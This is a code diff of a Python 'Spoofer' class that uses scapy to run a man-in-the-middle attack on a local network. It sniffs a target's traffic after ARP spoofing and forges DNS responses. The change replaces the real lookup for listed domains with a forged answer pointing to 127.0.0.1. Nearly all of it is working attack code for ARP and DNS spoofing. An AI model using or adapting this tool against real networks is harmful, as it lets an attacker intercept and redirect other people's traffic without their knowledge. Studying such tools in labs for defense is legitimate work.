@@ -31,13 +31,13 @@ class Spoofer:
         # sending the packet
         scapy.send(packet, verbose=False)
 
-            
-    
+
+
     def checkout(self):
         """stop spoofing.
         """
         self.restore_defaults(self.__target_ip,self.__ip)
-    
+
     def restore_defaults(self,dest, source):
         # getting the real MACs
         target_mac = self.get_mac(dest) # 1st (router), then (windows)
@@ -65,12 +65,12 @@ class Spoofer:
         mac = answer[0][1].hwsrc
         return mac
 
-    
+
     def process_packet(self,packet):
         """
-        This function will identify when a request is a DNS request, and handle it. If the requested address is 
+        This function will identify when a request is a DNS request, and handle it. If the requested address is
         in the urls list, than send IP of the real url. Otherwise, return the real url.
-        
+
         When sniffing a dns packet from target:
         Extract domain name -> If is in url dict, replace for actual domain name -> Send dns query to dns server -> receive dns response -> Modify ip src and dst -> Send dns response to target.
         """
@@ -79,36 +79,47 @@ class Spoofer:
             domain: str = dns_layer.qd.qname.decode() # Retrieve domain.
             urls: dict[str,str] = self.get_urls()
             if domain in urls.keys():
-                response_packet = self.nslookup(urls[domain])
-                record_entry(domain,self.build_dict_from_packet(response_packet))
+                # Create DNS response with 127.0.0.1
+                response_packet = IP(dst=self.__target_ip) / UDP(sport=53, dport=53) / DNS(
+                    qr=1,  # This is a response
+                    rd=1,  # Recursion Desired
+                    ra=1,  # Recursion Available
+                    qd=DNSQR(qname=domain),  # Question section
+                    an=DNSRR(  # Answer section
+                        rrname=domain,
+                        ttl=60,
+                        rdata="127.0.0.1"
+                    )
+                )
+                # record_entry(domain,self.build_dict_from_packet(packet))
             else:
                 response_packet = self.nslookup(domain)
-                
+
             response_packet[IP].src,response_packet[IP].dst = packet[IP].dst,packet[IP].src
             # Modify the response packet, so it will match target's original query.
             scapy.send(response_packet) #type:ignore
-    
+
     def forward_to_router(self):
         """
-        Performs MITM. 
+        Performs MITM.
         When the spoofing starts taking effect, all of the target computer's traffic will reach this machine.
         Using scapy to sniff all of the packets from target to router, and calling process_packet to handle them.
         """
-        scapy.sniff(filter=f"ip src {self.__target_ip} and ip dst not {self.__ip}",prn=self.process_packet,store=0) 
+        scapy.sniff(filter=f"ip src {self.__target_ip} and ip dst not {self.__ip}",prn=self.process_packet,store=0)
         # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
         # Dump all corresponding packets into process_packet to handle.
 
 
-    
-    
+
+
     def build_dict_from_packet(self,packet) -> dict:
         d: dict = {}
         d["Time"] = str(time.time())
         d["IP"] = packet[IP].src
         d["MAC address"] = self.get_mac(d["IP"])
         return d
-    
-    
+
+
     def get_urls(self) -> dict[str,str]:
         """
         return url dict, from urls.json
@@ -121,15 +132,15 @@ class Spoofer:
         return urls
 
 
-    def nslookup(self,domain) -> scapy.Packet: 
+    def nslookup(self,domain) -> scapy.Packet:
         dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(qdcount=1, rd=1,qd = 0)/DNSQR(qname=domain)
         response_packet = sr1(dns_query,verbose=0)
         return response_packet #type:ignore
-        
+
         #### Maybe for future use.
         dnsrr_list = response_packet.an
-        
-        
+
+
         # Check if the response contain Canonical name
         if dnsrr_list[0].type == 5:
             print("Name:   ", dnsrr_list[0].rdata.decode())
@@ -144,8 +155,4 @@ class Spoofer:
             # Print all dnsrrs
             for dnsrr in dnsrr_list:
                 if (dnsrr != None):
-                    print(dnsrr.rdata)  
-        
-
-
-
+                    print(dnsrr.rdata)
